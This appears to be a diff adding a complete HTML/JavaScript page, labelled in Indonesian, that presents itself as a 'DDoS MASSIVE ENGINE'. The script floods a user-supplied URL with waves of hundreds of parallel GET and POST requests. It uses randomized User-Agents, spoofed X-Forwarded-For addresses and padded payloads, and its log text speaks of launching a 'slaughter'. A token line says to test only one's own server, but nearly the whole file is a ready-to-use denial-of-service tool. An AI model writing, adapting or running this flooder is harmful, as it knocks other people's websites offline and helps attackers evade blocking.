@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NXR-DEMON TURBO DDoS</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body {
+    background: #000;
+    color: #0f0;
+    font-family: 'Courier New', monospace;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 20px;
+  }
+  .container {
+    background: #0a0a0a;
+    border: 3px solid #0f0;
+    border-radius: 25px;
+    padding: 35px;
+    max-width: 850px;
+    width: 100%;
+    box-shadow: 0 0 60px #0f04, inset 0 0 30px #0f02;
+  }
+  h1 {
+    text-align: center;
+    color: #ff0044;
+    text-shadow: 0 0 30px #ff0044, 0 0 60px #ff004466;
+    font-size: 2.5em;
+    letter-spacing: 5px;
+  }
+  .sub {
+    text-align: center;
+    color: #88ff88;
+    margin-bottom: 20px;
+    font-size: 14px;
+    opacity: 0.7;
+  }
+  .input-group {
+    display: flex;
+    gap: 10px;
+    flex-wrap: wrap;
+  }
+  .input-group input {
+    flex: 1;
+    padding: 15px;
+    border: 2px solid #0f04;
+    border-radius: 12px;
+    background: #111;
+    color: #0f0;
+    font-size: 16px;
+    min-width: 200px;
+  }
+  .input-group input:focus {
+    border-color: #0f0;
+    outline: none;
+    box-shadow: 0 0 20px #0f04;
+  }
+  .btn-group {
+    display: flex;
+    gap: 12px;
+    margin: 15px 0;
+    flex-wrap: wrap;
+  }
+  .btn-group button {
+    flex: 1;
+    padding: 16px;
+    border: none;
+    border-radius: 12px;
+    font-weight: bold;
+    font-size: 18px;
+    cursor: pointer;
+    transition: 0.3s;
+    min-width: 120px;
+    text-transform: uppercase;
+    letter-spacing: 2px;
+  }
+  #startBtn {
+    background: #ff0044;
+    color: #fff;
+    box-shadow: 0 0 30px #ff004466;
+  }
+  #startBtn:hover { background: #cc0033; box-shadow: 0 0 50px #ff0044; }
+  #stopBtn {
+    background: #333;
+    color: #aaa;
+  }
+  #stopBtn:hover { background: #555; color: #fff; }
+  #log {
+    background: #050505;
+    height: 220px;
+    overflow-y: auto;
+    padding: 15px;
+    border-radius: 12px;
+    border: 1px solid #0f03;
+    font-size: 13px;
+    white-space: pre-wrap;
+    word-break: break-all;
+    margin-top: 10px;
+    line-height: 1.6;
+  }
+  .stats {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 10px;
+    margin-top: 15px;
+    text-align: center;
+    background: #0a0a0a;
+    padding: 15px;
+    border-radius: 12px;
+    border: 1px solid #0f03;
+  }
+  .stats span { font-size: 14px; color: #88ff88; }
+  .stats .num { color: #0f0; font-weight: bold; font-size: 22px; display: block; }
+  .warning {
+    color: #ff8800;
+    font-size: 13px;
+    margin-top: 10px;
+    text-align: center;
+    border-top: 1px solid #ff880033;
+    padding-top: 10px;
+  }
+  ::-webkit-scrollbar { width: 6px; }
+  ::-webkit-scrollbar-track { background: #000; }
+  ::-webkit-scrollbar-thumb { background: #0f0; border-radius: 10px; }
+</style>
+</head>
+<body>
+<div class="container">
+  <h1>⚡ NXR-TURBO ⚡</h1>
+  <div class="sub">— DDoS MASSIVE ENGINE v3.0 —</div>
+
+  <div class="input-group">
+    <input id="target" placeholder="https://target.com" value="https://example.com">
+  </div>
+
+  <div class="btn-group">
+    <button id="startBtn">🔥 SERANG</button>
+    <button id="stopBtn">⏹ STOP</button>
+  </div>
+
+  <div id="log">[+] NXR-Turbo siap, Yang Mulia...\n[+] Masukkan target dan tekan SERANG.\n</div>
+
+  <div class="stats">
+    <div><span class="num" id="reqCount">0</span><span>Request</span></div>
+    <div><span class="num" id="statusText">SIAGA</span><span>Status</span></div>
+    <div><span class="num" id="speed">0/s</span><span>Kecepatan</span></div>
+  </div>
+
+  <div class="warning">⚠️ Gunakan hanya pada server milik sendiri untuk uji ketahanan.</div>
+</div>
+
+<script>
+// ====== NXR-TURBO DDoS ENGINE ======
+let attackActive = false;
+let totalRequests = 0;
+let lastCount = 0;
+let speed = 0;
+let intervals = [];
+let timeouts = [];
+
+const targetInput = document.getElementById('target');
+const log = document.getElementById('log');
+const reqCountSpan = document.getElementById('reqCount');
+const statusSpan = document.getElementById('statusText');
+const speedSpan = document.getElementById('speed');
+
+// ==== Data besar untuk POST payload ====
+function generatePayload(size = 1024 * 10) { // 10KB per payload
+  return 'A'.repeat(size);
+}
+
+// ==== Random User-Agent ====
+function randomUA() {
+  const ua = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
+    'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0',
+    'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/121.0 Firefox/121.0'
+  ];
+  return ua[Math.floor(Math.random() * ua.length)];
+}
+
+// ==== Fake IP ====
+function fakeIP() {
+  return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
+}
+
+// ==== Random metode (GET / POST) ====
+function randomMethod() {
+  return Math.random() > 0.4 ? 'GET' : 'POST';
+}
+
+// ==== Kirim satu request ====
+async function sendRequest(url) {
+  if (!attackActive) return;
+  try {
+    const method = randomMethod();
+    const headers = {
+      'User-Agent': randomUA(),
+      'X-Forwarded-For': fakeIP(),
+      'Cache-Control': 'no-cache, no-store, must-revalidate',
+      'Pragma': 'no-cache',
+      'Expires': '0',
+      'Referer': 'https://www.google.com/',
+      'Accept': '*/*',
+      'Accept-Encoding': 'gzip, deflate, br',
+      'Connection': 'keep-alive',
+      'Upgrade-Insecure-Requests': '1'
+    };
+
+    let body = null;
+    if (method === 'POST') {
+      headers['Content-Type'] = 'application/x-www-form-urlencoded';
+      body = 'data=' + generatePayload(1024 * 5); // 5KB payload
+    }
+
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 1500);
+
+    await fetch(url, {
+      method: method,
+      headers: headers,
+      body: body,
+      signal: controller.signal,
+      mode: 'no-cors',
+      credentials: 'omit'
+    });
+
+    clearTimeout(timeout);
+  } catch (e) {
+    // diamkan
+  }
+  totalRequests++;
+  reqCountSpan.innerText = totalRequests;
+}
+
+// ==== Gelombang serangan (100 request paralel per gelombang) ====
+async function waveAttack(url) {
+  if (!attackActive) return;
+  const promises = [];
+  for (let i = 0; i < 150; i++) { // 150 request paralel per gelombang
+    if (!attackActive) break;
+    promises.push(sendRequest(url));
+  }
+  await Promise.allSettled(promises);
+  if (attackActive) {
+    // lanjut tanpa jeda
+    setTimeout(() => waveAttack(url), 5);
+  }
+}
+
+// ==== Update kecepatan ====
+setInterval(() => {
+  const now = totalRequests;
+  speed = now - lastCount;
+  lastCount = now;
+  speedSpan.innerText = speed + '/s';
+}, 1000);
+
+// ==== Mulai serangan ====
+document.getElementById('startBtn').addEventListener('click', function() {
+  let url = targetInput.value.trim();
+  if (!url) {
+    log.innerText += '[!] Masukkan URL target, Yang Mulia!\n';
+    log.scrollTop = log.scrollHeight;
+    return;
+  }
+  if (!url.startsWith('http://') && !url.startsWith('https://')) {
+    url = 'https://' + url;
+  }
+
+  if (attackActive) {
+    log.innerText += '[!] Serangan sudah berjalan!\n';
+    log.scrollTop = log.scrollHeight;
+    return;
+  }
+
+  attackActive = true;
+  totalRequests = 0;
+  lastCount = 0;
+  statusSpan.innerText = '🔥 MENYERANG';
+  log.innerText += `[🔥] Serangan turbo ke ${url} dimulai!\n`;
+  log.innerText += `[💀] Mode: GET+POST hybrid dengan payload besar\n`;
+  log.scrollTop = log.scrollHeight;
+
+  // Jalankan 10 gelombang paralel untuk membanjiri
+  for (let i = 0; i < 10; i++) {
+    const delay = i * 10;
+    const id = setTimeout(() => {
+      if (attackActive) waveAttack(url);
+    }, delay);
+    timeouts.push(id);
+  }
+
+  // Tambahkan interval tambahan untuk serangan lebih ganas
+  for (let i = 0; i < 5; i++) {
+    const id = setInterval(() => {
+      if (attackActive) {
+        for (let j = 0; j < 50; j++) sendRequest(url);
+      }
+    }, 50 + i * 10);
+    intervals.push(id);
+  }
+});
+
+// ==== Hentikan serangan ====
+document.getElementById('stopBtn').addEventListener('click', function() {
+  attackActive = false;
+  statusSpan.innerText = '⏹ STOP';
+  log.innerText += '[⏹] Serangan dihentikan atas perintah Yang Mulia.\n';
+  log.scrollTop = log.scrollHeight;
+
+  // Bersihkan semua interval & timeout
+  intervals.forEach(id => clearInterval(id));
+  timeouts.forEach(id => clearTimeout(id));
+  intervals = [];
+  timeouts = [];
+});
+
+// Inisialisasi log
+log.innerText += '[✅] Sistem siap tempur.\n';
+log.innerText += '[📌] Tekan SERANG untuk memulai pembantaian.\n';
+</script>
+</body>
+</html>
